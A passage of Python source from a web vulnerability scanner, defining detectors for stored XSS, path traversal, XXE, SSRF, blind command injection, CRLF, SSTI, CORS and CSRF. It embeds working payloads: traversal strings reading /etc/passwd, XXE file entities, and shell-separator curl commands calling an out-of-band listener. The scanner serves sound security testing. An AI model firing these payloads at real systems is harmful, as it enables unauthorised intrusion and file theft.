                fields.append((name, value))   # click the primary button
                btn_done = True
        else:
            fields.append((name, value))
    if not target_seen:
        return origin_resp, None, []
    action_abs = form["_action_abs"]
    form_method = (form.get("method") or "GET").upper()
    if form_method == "GET":
        # the form's OWN action query rides along; same-named form fields override it
        sub = urllib.parse.urlsplit(action_abs)
        qfields = dict(urllib.parse.parse_qsl(sub.query, keep_blank_values=True))
        for n, v in fields:
            qfields[n] = v
        submit_ep = _get_endpoint_for(action_abs, method="GET",
                                      params=[Parameter(n, ParamLocation.QUERY, v)
                                              for n, v in qfields.items()])
        submit_resp = engine.send(RequestMutation(endpoint=submit_ep, note="stored-xss-submit"))
    else:
        # POST: the action's own query (?id=0 on ASP.NET forms) rides in the URL,
        # the form fields ride in the body; Referer = the form's page (browsers
        # always send it; some servers enforce it on state-changing POSTs)
        submit_ep = _get_endpoint_for(action_abs, method="POST")
        submit_resp = engine.send(RequestMutation(endpoint=submit_ep, note="stored-xss-submit",
                                                  body_override=urllib.parse.urlencode(fields),
                                                  extra_headers={"Referer": origin_url}))
    if submit_resp is None or submit_resp.error:
        return origin_resp, submit_resp, []
    # 3) render surfaces (deterministic order, deduped)
    if surfaces is None:
        parent = action_abs.rsplit("/", 1)[0] + "/"
        surfaces = [action_abs, origin_url, parent]
    seen, uniq = set(), []
    for s in surfaces:
        if s not in seen:
            seen.add(s)
            uniq.append(s)
    hits = []
    for s_url in uniq:
        r1 = engine.send(RequestMutation(endpoint=_get_endpoint_for(s_url), note="stored-xss-render"))
        if r1 is None or r1.error or canary not in (r1.body or ""):
            continue
        # 4) persistence control: independent second fetch must still carry it raw
        r2 = engine.send(RequestMutation(endpoint=_get_endpoint_for(s_url), note="stored-xss-render-persist"))
        if r2 is not None and not r2.error and canary in (r2.body or ""):
            hits.append((s_url, r1, r2))
    return origin_resp, submit_resp, hits


class StoredXSSDetector(Detector):
    """DETECT-16 (v4.2.3, two live-caught gaps from the IV13 independent round,
    2026-10-03): the engine was REFLECTED-only — a canary that renders only on a
    LATER request was structurally invisible.
      Gap A — testaspnet.vulnweb.com /Comments.aspx `tbComment`: <u> marker posted
      via the real form (full __VIEWSTATE round-trip) renders raw on reload
      (iv13_evidence/aspnet2.json: post 200 -> reload 200, raw markup).
      Gap B — google-gruyere.appspot.com /saveprofile `uid`: GET-form signup, the
      GRUYERE cookie carries the raw uid and the home menu-user span renders it
      raw (iv13_evidence/gruyere_probes.json: stored_markup_raw true).
    Both reduce to the shared flow above. Gated to CONTENT-SUBMISSION forms
    (comment/profile/signup/register/...): search, login and commerce forms never
    store attacker content and probing them is budget spent for nothing — this
    gate also means ZERO shared-fixture forms match (bench: zero new requests,
    zero verdict changes; the new coverage is proven by the dedicated unit
    mini-apps and the frozen-build mechanism probes instead)."""
    name, vuln_type = "xss_stored", "xss_stored"
    severity = Severity.HIGH
    CONTENT_WORDS = ("comment", "reply", "review", "profile", "signup", "sign-up",
                     "register", "guestbook", "feedback", "message", "board",
                     "thread", "news", "bio", "nickname", "signature", "uid",
                     "username", "save", "update", "edit")
    # canaries are per-param (<sentinelst0>, <sentinelst1>) — see run()
    MAX_PARAMS_PER_FORM = 2

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def _content_form(self, ep: Endpoint) -> bool:
        path = urllib.parse.urlsplit(ep.url).path.lower()
        segments = [s for s in path.split("/") if s]
        params = [p.name.lower() for p in ep.parameters]
        return any(w in t for t in segments + params for w in self.CONTENT_WORDS)

    @staticmethod
    def _origin_of(ep: Endpoint) -> str:
        for t in (ep.tags or []):
            if t.startswith("form_origin:"):
                return t.split(":", 1)[1]
        return ep.url        # fallback: self-referencing form (action == page)

    def run(self, ep: Endpoint) -> list:
        if ep.source != DiscoverySource.CRAWL_FORM:   # str-Enum: value comparison
            return []
        if "divform" in (ep.tags or []):
            return []                              # JS-built pseudo-forms: out of scope here
        if (ep.method or "GET").upper() not in ("GET", "POST"):
            return []
        if not self._content_form(ep):
            return []
        origin_url = self._origin_of(ep)
        # pre-filter: ONE fresh parse tells which endpoint params are render-capable
        # mutable fields on the live form — hidden ride-alongs (__VIEWSTATE et al.)
        # and passwords are skipped BEFORE any submit is spent on them.
        _o, form = fresh_form(self.engine, origin_url, ep)
        if form is None:
            return []
        mutable = {n for n, _v, ft in form["fields"]
                   if ft not in ("hidden", "password", "submitbutton")}
        findings, budget, probed = [], self.MAX_PARAMS_PER_FORM, 0
        for p in ep.parameters:
            if budget <= 0:
                break
            if p.kind == ParamKind.TOKEN or p.name not in mutable:
                continue
            # unique canary per probed param: once one param's marker is stored,
            # every later render of the surface carries it — a second param probed
            # with the SAME marker would inherit the first probe's hit (false
            # attribution, caught by the unit test's tbName control).
            canary = f"<sentinelst{probed}>"
            probed += 1
            _o, _s, hits = stored_xss_flow(self.engine, ep, p.name, canary, origin_url)
            if not hits:
                continue
            s_url, r1, r2 = hits[0]
            i = (r1.body or "").find(canary)
            ctx = (r1.body or "")[max(0, i - 60):i + 80].replace("\n", " ")
            all_surfaces = " | ".join(u for u, _a, _b in hits)
            findings.append(Finding(
                "xss_stored", Severity.HIGH, ep.url, p.name, ep.method,
                [Evidence("stored_xss_reflection",
                          f"canary markup submitted via the real form persisted server-side and "
                          f"rendered RAW on {s_url} — survived an independent re-fetch "
                          f"(transient echoes are reflections, not storage)",
                          r1.request_id, ctx),
                 Evidence("stored_xss_surfaces",
                          "render surfaces: " + all_surfaces,
                          r2.request_id, "")],
                status=FindingStatus.CANDIDATE))
            budget -= 1
        return findings


# ------------------------------------------------------------ DETECT-17 (v4.2.3): traversal in the URL path
class PathTraversalDetector(Detector):
    """DETECT-17 (v4.2.3, live-caught gap from the IV13 independent round):
    traversal IN THE URL PATH was never probed — the battery was param-bound only.
    google-gruyere.appspot.com serves /<inst>/..%2f..%2f..%2f..%2fetc%2fpasswd
    -> 200, 246 B of real /etc/passwd content (iv13_evidence/gruyere_probes.json
    trav-4up-passwd; the ..%2f URL-encoded shape survives front-line path
    normalization because the server decodes %2f AFTER it — the plain ../ and
    2-up shapes fail on that stack). The battery carries encoded and plain
    shapes at three depths from each probe base. Runs once per scan from the
    target root + the crawled directory prefixes (see orchestrator), NOT per
    endpoint."""
    name, vuln_type = "trav_path", "path_traversal"
    severity = Severity.HIGH
    PAYLOADS = ["..%2f" * 4 + "etc%2fpasswd",
                "..%2f" * 2 + "etc%2fpasswd",
                "..%2f" * 6 + "etc%2fpasswd",
                "..%2f" * 4 + "windows%2fwin.ini",
                "../" * 4 + "etc/passwd"]

    def candidates(self, ep: Endpoint):          # not used — see run_base(base)
        return []

    def run_base(self, base: str) -> list:
        findings = []
        for pl in self.PAYLOADS:
            url = base.rstrip("/") + "/" + pl
            r = self.engine.send(RequestMutation(endpoint=_get_endpoint_for(url),
                                                 note="path-traversal-probe"))
            if r is None or r.error or not r.body:
                continue
            for marker, fname in TraversalDetector.MARKERS:
                if marker in r.body:
                    i = r.body.find(marker)
                    findings.append(Finding(
                        "path_traversal", Severity.HIGH, url, "", "GET",
                        [Evidence("path_file_marker",
                                  f"content of {fname} leaked via URL-PATH traversal "
                                  f"(marker {marker!r} at offset {i})",
                                  r.request_id, r.body[i:i + 200])],
                        status=FindingStatus.CANDIDATE))
                    break
            if findings:
                break               # depth ladder stops at the first hit per base
        return findings


class RedirectDetector(Detector):
    name, vuln_type = "redirect", "open_redirect"
    severity = Severity.MEDIUM

    def candidates(self, ep: Endpoint):
        ev = "sentinel-redirect-check.example.org"
        return [(v, RequestMutation(endpoint=ep, param_name=p.name, param_value=v))
                for p in ep.parameters if p.kind != ParamKind.TOKEN and not p.flow_control
                for v in (f"https://{ev}/probe", f"//{ev}/probe")]

    def analyze(self, pair, resp):
        ep, p = pair
        if resp is None: return None
        loc = resp.hop_location()   # ENG-01: chain-aware (same-host followed redirects included)
        if loc and "sentinel-redirect-check.example.org" in loc:
            return Finding("open_redirect", Severity.MEDIUM, ep.url, p.name, ep.method,
                           [Evidence("header_value", f"Location redirects off-site to {loc[:100]}", resp.request_id)],
                           status=FindingStatus.CANDIDATE)
        # reflected/meta/JS redirect context
        if resp.body and ("sentinel-redirect-check.example.org" in resp.body and
                          re.search(r"(location\.href|window\.location|http\.refresh|meta[^>]+refresh)", resp.body, re.I)):
            return Finding("open_redirect", Severity.MEDIUM, ep.url, p.name, ep.method,
                           [Evidence("body_redirect", "off-site URL injected into client redirect sink", resp.request_id)],
                           status=FindingStatus.CANDIDATE)
        return None


class CrlfDetector(Detector):
    """DETECT-07 (live-caught on ginandjuice.shop /catalog?category=): response header
    injection. The category value flows into `Set-Cookie: category=<value>` WITHOUT
    CRLF sanitization — %0d%0a in the param splits a second attacker-controlled header
    (verified live: x-sentinel-probe appeared in real response headers). Detection:
    inject a CRLF + uniquely-named probe header; if the server emits it, header
    injection is proven. Enables cookie injection, CSP/Cache-Control override, session
    fixation. Numeric params are skipped (never header-reflected in practice)."""
    name, vuln_type = "crlf", "http_response_header_injection"
    severity = Severity.HIGH
    PROBE_VALUE = "sentinelcrlf\r\nX-Sentinel-Probe: injected"
    PROBE_HEADER = "x-sentinel-probe"

    def candidates(self, ep: Endpoint):
        return [RequestMutation(endpoint=ep, param_name=p.name, param_value=self.PROBE_VALUE)
                for p in ep.parameters if p.kind not in (ParamKind.NUMERIC, ParamKind.TOKEN) and not p.flow_control]

    def analyze(self, pair, resp):
        ep, p = pair
        if resp is None or not resp.headers: return None
        v = resp.headers.get(self.PROBE_HEADER, "")
        if v:
            return Finding("http_response_header_injection", Severity.HIGH, ep.url, p.name, ep.method,
                [Evidence("header_value",
                          f"CRLF in param split a second response header: {self.PROBE_HEADER}: {v[:80]!r} "
                          f"(attacker-controlled header injection)", resp.request_id)],
                status=FindingStatus.CANDIDATE)
        return None


class XxeDetector(Detector):
    """DETECT-08 (live-caught on ginandjuice.shop /catalog/product/stock): XML external
    entity injection on endpoints whose REAL request shape is built by JavaScript
    (form data is wrapped into <stockCheck> XML with Content-Type application/xml —
    xmlStockCheckPayload.js). DISC-06 learns the XML root from that JS statically; this
    detector then replays the transformation with external entities. No browser needed.

    Live-proven oracle: entity-resolved file content changes the response body
    (/etc/hostname -> 648, /etc/passwd -> 295, nonexistent -> 23); unreadable files
    (/etc/shadow) equal the nonexistent control — true file-read semantics.

    BLIND-XXE LIMIT (live-proven on ginandjuice.shop itself): when the response is
    independent of entity content (random stock numbers per request — same file gave
    23/768/52/191/52 across five probes), NO response-based oracle exists. The double-
    control stability check (control probed twice, must match) rejects such noise at
    detection time; blind XXE needs OOB/Collaborator confirmation (documented future
    phase — parameter entities are blocked there, so even error-based tricks fail).

    Two-phase probe: recon XML (form params only) reveals expected-but-missing
    elements from the app's own error text ("Store ID could not be parsed" -> storeId);
    then a 4-probe differential (control x2 vs /etc/hostname vs /etc/passwd)."""
    name, vuln_type = "xxe", "xxe"
    severity = Severity.CRITICAL
    ENTITY = "sentinelxxe"
    FILES = ["file:///etc/hostname", "file:///etc/passwd"]
    CONTROL = "file:///nonexistent-sentinel-control"

    def _xml(self, root, fields: list, entity_file=None, entity_target=None):
        ents = (f'<!DOCTYPE {root} [<!ENTITY {self.ENTITY} SYSTEM "{entity_file}">]>'
                if entity_file else "")
        body = "".join(f"<{k}>{v}</{k}>" for k, v in fields)
        if entity_target is not None:
            body += f"<{entity_target}>&{self.ENTITY};</{entity_target}>"
        return f'<?xml version="1.0" encoding="UTF-8"?>{ents}<{root}>{body}</{root}>'

    def _mutation(self, ep, xml):
        return RequestMutation(endpoint=ep, body_override=xml, method="POST",
                               extra_headers={"Content-Type": "application/xml"})

    def candidates(self, ep: Endpoint):
        # Only POST endpoints with form params are candidates for XML replay, and only
        # when the crawl statically learned an XML transformation from JS (DISC-06).
        if (ep.method or "GET").upper() != "POST" or not ep.parameters:
            return []
        from .discovery import JS_XML_HINTS
        roots = sorted(JS_XML_HINTS)
        if not roots:
            return []                       # no JS-learned XML transform: skip (request economy)
        fields = [(p.name, p.value or "1") for p in ep.parameters]
        return [(f"recon|{root}", self._mutation(ep, self._xml(root, fields)))
                for root in roots]

    def expand(self, ep, recon_resp, root):
        """Phase 2 — build the entity differential probes from the recon response."""
        fields = [(p.name, p.value or "1") for p in ep.parameters]
        targets = [p.name for p in ep.parameters]
        body = (recon_resp.body or "") if recon_resp else ""
        # Error-driven element discovery: "Store ID could not be parsed" -> storeId
        for m in re.finditer(r"([A-Za-z][a-z]{1,20}) ID could not be parsed", body):
            word = m.group(1)
            cand = word[0].lower() + word[1:] + "Id"
            if cand and cand not in targets:
                targets.append(cand)
        probes = []
        for t in targets[:4]:
            # control TWICE: response-determinism gate (blind-XXE targets answer with
            # per-request random values — an unstable control proves the response carries
            # no entity-content information, so the differential is meaningless noise).
            probes.append((f"control|{root}|{t}", self._mutation(ep, self._xml(root, fields, self.CONTROL, t))))
            probes.append((f"control2|{root}|{t}", self._mutation(ep, self._xml(root, fields, self.CONTROL, t))))
            for f in self.FILES:
                probes.append((f"probe|{root}|{t}|{f}", self._mutation(ep, self._xml(root, fields, f, t))))
        return probes

    def analyze(self, pair, resp_map) -> Finding | None:
        ep, _ = pair
        by_elem: dict = {}
        for key, r in resp_map.items():
            parts = key.split("|")
            if parts[0] == "probe":
                by_elem.setdefault(parts[2], {})[parts[3]] = r
            elif parts[0] in ("control", "control2"):
                by_elem.setdefault(parts[2], {})[parts[0]] = r
        for elem, m in by_elem.items():
            ctrl, ctrl2 = m.get("control"), m.get("control2")
            if ctrl is None or ctrl2 is None or len(m) < 4:
                continue
            # stability gate: same control payload twice must produce the SAME response
            if ctrl.status != ctrl2.status or (ctrl.body or "") != (ctrl2.body or ""):
                continue
            diffs = []
            for f, r in m.items():
                if f in ("control", "control2"):
                    continue
                if r.status != ctrl.status or (r.body or "") != (ctrl.body or ""):
                    diffs.append(f"{f.rsplit('/', 1)[-1]}: entity -> {r.status} {(r.body or '')[:30]!r} "
                                 f"vs control {ctrl.status} {(ctrl.body or '')[:30]!r}")
            # both fresh files must differ from control (2 independent confirmations)
            if len(diffs) >= 2:
                root = next((k.split("|")[1] for k in resp_map if k.startswith("probe|")), "?")
                return Finding("xxe", Severity.CRITICAL, ep.url, elem, "POST",
                    [Evidence("entity_differential",
                              f"external entity resolution confirmed via response differential — {'; '.join(diffs[:3])}. "
                              f"recipe: root={root} element={elem}",
                              ctrl.request_id)],
                    status=FindingStatus.CANDIDATE)
        return None

    # ------------------------------------------------------------ OOB (Phase 49)
    def _oob_iid(self, ep, elem: str, tag: str) -> str:
        """Deterministic interaction id: same endpoint+element+tag -> same id across
        runs (evidence stays reproducible; the listener port never leaks into it)."""
        import hashlib
        return "oob-" + hashlib.sha1(f"{ep.url}|{elem}|{tag}".encode()).hexdigest()[:12]

    def _elements_for(self, ep, recon_body: str) -> list[str]:
        """Element targeting for the OOB path: error-discovered elements FIRST (the
        app's own error names the real content target — live-proven on ginandjuice:
        'Store ID could not be parsed' -> storeId), then form params as fallback."""
        params = [p.name for p in ep.parameters]
        discovered = []
        for m in re.finditer(r"([A-Za-z][a-z]{1,20}) ID could not be parsed", recon_body or ""):
            word = m.group(1)
            cand = word[0].lower() + word[1:] + "Id"
            if cand not in discovered:
                discovered.append(cand)
        return discovered + [p for p in params if p not in discovered]

    def oob_attempt(self, ep, root: str, recon_resp, oast) -> Finding | None:
        """BLIND-XXE path (live-proven necessity on ginandjuice.shop stock): when the
        response carries NO entity-content information (stability gate failed above),
        the only evidence channel is an OUT-OF-BAND fetch. Send an external entity
        pointing at our OAST listener; a callback proves server-side entity
        resolution — response-independent, so it works exactly where the response
        oracle cannot. Request economy: first 2 elements only, one probe each."""
        elements = self._elements_for(ep, (recon_resp.body or "") if recon_resp else "")[:2]
        for elem in elements:
            iid = self._oob_iid(ep, elem, "detect")
            fields = [(p.name, p.value or "1") for p in ep.parameters]
            xml = self._xml(root, fields, oast.url(iid), elem)
            m = self._mutation(ep, xml)
            r = self.engine.send(m)
            if r.error:
                continue
            hit = oast.poll(iid, timeout=2.0)
            if hit:
                if is_self_callback(hit, r, oast.url(iid)):
                    continue                    # ENG-08: scanner-initiated fetch, not the target
                h = hit[0]
                # Phase 52: source attribution — the callback's origin IP + UA make
                # the evidence self-contained (live case: ginandjuice.shop fetched
                # its entity from 54.170.155.72 with UA "ginandjuice.shop; ...").
                src = h.get("ip") or h.get("host") or "unknown"
                ua = (h.get("ua") or "")[:60]
                src_txt = f" from {src}" + (f" (ua={ua})" if ua else "")
                return Finding("xxe", Severity.CRITICAL, ep.url, elem, "POST",
                    [Evidence("oob_callback",
                              f"target fetched the external entity out-of-band{src_txt} "
                              f"(interaction {iid} via {h.get('method', 'GET')} at t+{h.get('t', 0):.0f}) — "
                              f"blind XXE: entity resolution proven with NO response oracle. "
                              f"recipe: root={root} element={elem} iid={iid}",
                              r.request_id)],
                    status=FindingStatus.CANDIDATE)
        return None


# ------------------------------------------------------------ DETECT-11/12 (Phase 53): OAST-channel classes
class SsrfDetector(Detector):
    """DETECT-11 (SSRF, server-side request forgery): params whose name or value
    marks them as URL carriers are pointed at the OAST channel — if the SERVER
    (not the client) fetches our URL, the callback is out-of-band proof of a
    server-side fetch. This is the exact evidence pattern live-proven for blind
    XXE on ginandjuice.shop (v2.4.0): response-independent confirmation.
    Gated on an armed OAST channel (needs_oast) — without one the detector is
    inert (response-only SSRF oracles are unreliable: a 200/latency differential
    is ambient noise on real apps, live-observed on the noise-cycling stock
    endpoint). Request economy: name/value-gated params only, hard probe cap."""
    name, vuln_type = "ssrf", "ssrf"
    severity = Severity.HIGH
    needs_oast = True
    URL_NAMES = {"url", "uri", "link", "href", "page", "redirect", "dest", "destination",
                 "next", "target", "src", "source", "fetch", "callback", "return",
                 "returnto", "continue", "domain", "site", "load", "data", "reference",
                 "proxy", "feed", "open", "window", "image", "img", "out", "nav", "go", "u"}
    MAX_PROBES = 12                     # deterministic budget (endpoint order is deterministic)
    POLL_LOCAL = 0.15                   # local callbacks land synchronously, before the probe response

    def __init__(self, engine, bus, strategy_store=None, oast=None):
        super().__init__(engine, bus, strategy_store)
        self.oast = oast
        self._probes = 0

    def _iid(self, ep, param: str, tag: str) -> str:
        import hashlib
        return "oob-" + hashlib.sha1(f"ssrf|{ep.url}|{param}|{tag}".encode()).hexdigest()[:12]

    def candidates(self, ep: Endpoint):
        if self.oast is None or self._probes >= self.MAX_PROBES:
            return []
        out = []
        for p in ep.parameters:
            if p.kind in (ParamKind.TOKEN, ParamKind.NUMERIC) or p.flow_control or getattr(p, "is_file", False):
                continue
            val = (p.value or "").lower()
            urlish = p.name.lower() in self.URL_NAMES or val.startswith(("http://", "https://", "//"))
            if not urlish:
                continue
            iid = self._iid(ep, p.name, "detect")
            out.append(RequestMutation(endpoint=ep, param_name=p.name,
                                       param_value=self.oast.url(iid), note=f"ssrf:{iid}"))
            self._probes += 1
            if self._probes >= self.MAX_PROBES:
                break
        return out

    def analyze(self, pair, resp):
        ep, p = pair
        if p is None or self.oast is None:
            return None
        iid = self._iid(ep, p.name, "detect")
        hit = self.oast.poll(iid, timeout=(3.0 if getattr(self.oast, "channel", "") == "public-webhook" else self.POLL_LOCAL))
        if hit:
            if is_self_callback(hit, resp, self.oast.url(iid)):
                return None                      # ENG-08: the scanner fetched it itself
            h = hit[0]
            src = h.get("ip") or "unknown"
            ua = (h.get("ua") or "")[:60]
            return Finding("ssrf", Severity.HIGH, ep.url, p.name, ep.method,
                [Evidence("oob_callback",
                          f"server fetched the attacker-supplied URL out-of-band from {src}"
                          + (f" (ua={ua})" if ua else "") +
                          f" (interaction {iid} via {h.get('method', 'GET')}) — SSRF: the "
                          f"application made the request itself. recipe: param={p.name} iid={iid}",
                          resp.request_id)],
                status=FindingStatus.CANDIDATE)
        return None


class CommandInjectionDetector(Detector):
    """DETECT-12 (blind OS command injection): shell-metacharacter variants that
    make the server fetch our OAST URL. A callback proves code LEFT the app's
    shell — the strongest execution evidence short of response output, and the
    ONLY reliable one when command output never reaches the response (blind).
    Lives on the OAST channel like DETECT-11; inert without one. Budget: first
    MAX_PARAMS mutable params per scan, a 2-variant separator battery per param
    (both variants share one interaction id — the battery narrows the trigger
    context, the id stays single so polling stays cheap).
    OWSP-09 (OWASP campaign, live-caught on the OWASP Benchmark): the historical
    MAX_PARAMS=24 floor SILENTLY disabled the whole detector class on any
    surface larger than 24 mutable params — on the Benchmark the battery
    reached params 1-24 of ~2700 and the other ~2670 surfaces were never probed
    for command injection, with zero accounting (candidates=0 looked like
    'absent', it was 'never probed'). The budget now scales to SCAN_WIDE_CAP so
    large surfaces keep coverage, still bounded for cost. NOTE (measured on the
    Benchmark, documented honestly): sinks that call Runtime.exec()/ProcessBuilder
    DIRECTLY (no shell) cannot fire the OOB battery at all — ';'/'&&' are literal
    argv tokens there; a response-oracle battery for exec-family sinks is a
    recorded coverage gap, not something this budget fix addresses."""
    name, vuln_type = "cmdi", "command_injection"
    severity = Severity.CRITICAL
    needs_oast = True
    MAX_PARAMS = 24                     # deterministic floor (small surfaces)
    SCAN_WIDE_CAP = 512                 # OWSP-09: large surfaces keep coverage
    VARIANTS = ["; curl -s {u} ;", "&& curl -s {u}"]      # separator battery
    VERIFY_TEMPLATE = "| curl -s {u}"    # VR-11: DIFFERENT syntax + fresh id
    POLL_LOCAL = 0.15                   # local callbacks land synchronously

    def __init__(self, engine, bus, strategy_store=None, oast=None):
        super().__init__(engine, bus, strategy_store)
        self.oast = oast
        self._probes = 0

    def _iid(self, ep, param: str, tag: str) -> str:
        import hashlib
        return "oob-" + hashlib.sha1(f"cmdi|{ep.url}|{param}|{tag}".encode()).hexdigest()[:12]

    def candidates(self, ep: Endpoint):
        if self.oast is None or self._probes >= self.SCAN_WIDE_CAP:
            return []
        out = []
        for p in ep.parameters:
            # OWSP-04: flow-control (submit-button) params must never carry an
            # APPEND payload either — base+v turned action=submit into
            # "submit; curl ..." and the gated route 405'd the whole probe
            # (live-caught on WrongSecrets 1.8.1, 360 dead requests).
            if p.kind in (ParamKind.TOKEN, ParamKind.NUMERIC) or p.flow_control or not p.name:
                continue
            base = p.value or "localhost"
            if len(base) > 60:
                base = base[:60]
            iid = self._iid(ep, p.name, "detect")
            for v in self.VARIANTS:
                out.append(RequestMutation(endpoint=ep, param_name=p.name,
                                           param_value=base + v.format(u=self.oast.url(iid)),
                                           note=f"cmdi:{iid}"))
            self._probes += 1
            if self._probes >= self.MAX_PARAMS:
                break
        return out

    def analyze(self, pair, resp):
        ep, p = pair
        if p is None or self.oast is None:
            return None
        iid = self._iid(ep, p.name, "detect")
        hit = self.oast.poll(iid, timeout=(3.0 if getattr(self.oast, "channel", "") == "public-webhook" else self.POLL_LOCAL))
        if hit:
            if is_self_callback(hit, resp, self.oast.url(iid)):
                return None                      # ENG-08: the scanner fetched it itself
            h = hit[0]
            src = h.get("ip") or "unknown"
            return Finding("command_injection", Severity.CRITICAL, ep.url, p.name, ep.method,
                [Evidence("oob_callback",
                          f"server executed a shell fetch out-of-band from {src} "
                          f"(interaction {iid}) — blind command injection: separator "
                          f"battery ([';', '&&']) triggered an outbound curl. "
                          f"recipe: param={p.name} iid={iid}",
                          resp.request_id)],
                status=FindingStatus.CANDIDATE)
        return None


class CorsDetector(Detector):
    """DETECT-13 (CORS misconfiguration): send a cross-origin probe header; if the
    server REFLECTS an arbitrary Origin in Access-Control-Allow-Origin WHILE
    also allowing credentials, any origin can read authenticated responses —
    the dangerous combination (ACAO:* without credentials is NOT reportable:
    no credentialed access, live doctrine: zero false positives). Header-only
    probe: one request per GET endpoint, no params needed (runs via run(ep)
    — the generic loop is param-bound). Verification (VR-10) replays with a
    FRESH origin value: reflection must repeat to be a finding."""
    name, vuln_type = "cors", "cors_misconfig"
    severity = Severity.HIGH
    PROBE_ORIGIN = "https://sentinel-probe.example"
    SKIP_EXT = (".css", ".js", ".png", ".jpg", ".jpeg", ".svg", ".gif", ".ico", ".woff", ".woff2", ".map")

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def run(self, ep: Endpoint) -> Finding | None:
        if (ep.method or "GET").upper() != "GET":
            return None
        if ep.url.split("?")[0].lower().endswith(self.SKIP_EXT):
            return None
        r = self.engine.send(RequestMutation(endpoint=ep, note="cors-probe",
                                             extra_headers={"Origin": self.PROBE_ORIGIN}))
        if r is None or r.error:
            return None
        acao = (r.headers or {}).get("access-control-allow-origin", "")
        acac = (r.headers or {}).get("access-control-allow-credentials", "")
        if self.PROBE_ORIGIN in acao and acac.strip().lower() == "true":
            return Finding("cors_misconfig", Severity.HIGH, ep.url, "Origin", "GET",
                [Evidence("header_reflection",
                          f"arbitrary Origin reflected WITH credentials: "
                          f"Access-Control-Allow-Origin: {acao[:80]} + "
                          f"Access-Control-Allow-Credentials: true — credentialed "
                          f"cross-origin reads from ANY origin", r.request_id)],
                status=FindingStatus.CANDIDATE)
        return None


class SstiDetector(Detector):
    """DETECT-15 (Server-Side Template Injection, RCE class): template-syntax
    arithmetic whose COMPUTED result appears in the response while the literal
    expression does not. Reflection-only apps echo the raw expression (literal
    present -> silent); ambient page numbers cannot survive VR-12 (a FRESH
    expression with a different result must evaluate on re-test). Self-driven
    per-endpoint flow (run(ep)) so the winning syntax FAMILY is known at
    analysis time — VR-12 re-tests that family with fresh operands. Battery
    covers the four dominant families: {{ }} (Jinja2/Twig), ${ } (FreeMarker/
    EL/Velocity), <%= %> (ERB), #{ } (Ruby/Thymeleaf)."""
    name, vuln_type = "ssti", "ssti"
    severity = Severity.CRITICAL
    MAX_PARAMS = 12                    # deterministic budget, param order is deterministic
    BATTERY = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]
    EXPECT = "49"

    def __init__(self, engine, bus, strategy_store=None):
        super().__init__(engine, bus, strategy_store)
        self._probes = 0

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def run(self, ep: Endpoint) -> Finding | None:
        if self._probes >= self.MAX_PARAMS:
            return None
        for p in ep.parameters:
            if self._probes >= self.MAX_PARAMS:
                break
            if (p.kind in (ParamKind.TOKEN, ParamKind.NUMERIC, ParamKind.URL, ParamKind.FILENAME)
                    or p.flow_control):
                continue
            self._probes += 1
            for expr in self.BATTERY:
                r = self.engine.send(RequestMutation(endpoint=ep, param_name=p.name,
                                                     param_value=expr, note=f"ssti:{expr}"))
                if r is None or r.error or not r.ok:
                    continue
                body = r.body or ""
                if self.EXPECT not in body or expr in body:
                    continue          # computed result absent OR raw echo (reflection only)
                return Finding("ssti", Severity.CRITICAL, ep.url, p.name, ep.method,
                    [Evidence("expression_eval",
                              f"template expression evaluated server-side: 7*7 -> "
                              f"{self.EXPECT} in response while the literal expression "
                              f"is absent — SSTI (RCE class). syntax={expr.split('7')[0]}"
                              f" param={p.name}", r.request_id)],
                    status=FindingStatus.CANDIDATE)
        return None


class CsrfDetector(Detector):
    """DETECT-16 (CSRF): state-changing POST endpoints whose form carries NO
    anti-CSRF token, probed with a hostile Origin+Referer replay. The oracle is
    acceptance: the cross-origin request must succeed like the same-origin
    baseline (same status class + similar body) — token-bearing forms are
    skipped outright (a TOKEN param means protection), read-only surfaces are
    skipped (state-change words gate), and 401/403 baselines are skipped (no
    honest anonymous oracle). VR-13 re-tests with a FRESH hostile origin."""
    name, vuln_type = "csrf", "csrf"
    severity = Severity.MEDIUM
    STATE_WORDS = ("subscribe", "submit", "save", "update", "delete", "remove",
                   "change", "transfer", "profile", "account", "password",
                   "feedback", "comment", "register", "signup", "vote", "follow",
                   "add", "create", "edit", "reset", "action", "donate", "buy",
                   "order", "post", "reply", "review",
                   "cart", "basket", "checkout", "coupon", "place")
    READ_WORDS = ("search", "check", "stock", "view", "find", "login", "signin",
                  "sign-in", "auth", "catalog", "list", "browse")
    PROBE_ORIGIN = "https://csrf-probe.example"

    def candidates(self, ep: Endpoint):          # not used — see run(ep)
        return []

    def _state_changing(self, ep: Endpoint) -> bool:
        # ENG-15 (live-caught on ginandjuice.shop /catalog/cart): the old rule
        # matched READ_WORDS as substrings ANYWHERE in url+params, so a READ
        # word used as a PARENT DIRECTORY ('catalog') demoted every commerce
        # action under it — the tokenless add-to-cart POST was never tested
        # and a proven CSRF (hostile-origin acceptance + SameSite=None cookie,
        # manually verified) went unreported. Words now match on path SEGMENTS
        # + param names; a READ word only demotes when it is a whole WORD of
        # the ACTION segment ('stock-check' reads, 'checkout' does NOT contain
        # the word 'check'), and a state-word PARAM rescues it (?action=remove
        # under a /search action is still a write, but ?address= is not 'add').
        path = urllib.parse.urlsplit(ep.url).path.lower()
        segments = [s for s in path.split("/") if s]
        params = [p.name.lower() for p in ep.parameters]
        tokens = segments + params
        if not any(w in t for t in tokens for w in self.STATE_WORDS):
            return False
        def _words(s: str) -> list:
            return [w for w in re.split(r"[^a-z0-9]+", s) if w]
        action_words = _words(segments[-1]) if segments else []
        if any(w in action_words for w in self.READ_WORDS):
            return any(w in _words(p) for p in params for w in self.STATE_WORDS)
        return True

    def run(self, ep: Endpoint) -> Finding | None:
        # OWSP-17 (OWASP campaign, live-caught on DVWA 3.x): the POST-only gate
        # skipped GET-method state-changing forms — but DVWA's own password-change
        # form is method=GET at low security, and SameSite=Lax (the modern browser
        # default) still attaches cookies to cross-site TOP-LEVEL GET navigations,
        # which makes GET-CSRF the surviving live class for legacy apps (no
        # SameSite attribute at all = both verbs exposed). The state-word gate
        # below still excludes read-only surfaces; OWSP-15's destructive-pair
        # guard keeps the probe non-committing on password-confirm forms.
        if (ep.method or "GET").upper() not in ("POST", "PUT", "PATCH", "DELETE", "GET"):
            return None
        if any(p.kind == ParamKind.TOKEN for p in ep.parameters):
            return None                          # the form carries an anti-CSRF token
        if not self._state_changing(ep):
            return None
        base = self.engine.send(RequestMutation(endpoint=ep, note="csrf-baseline"))
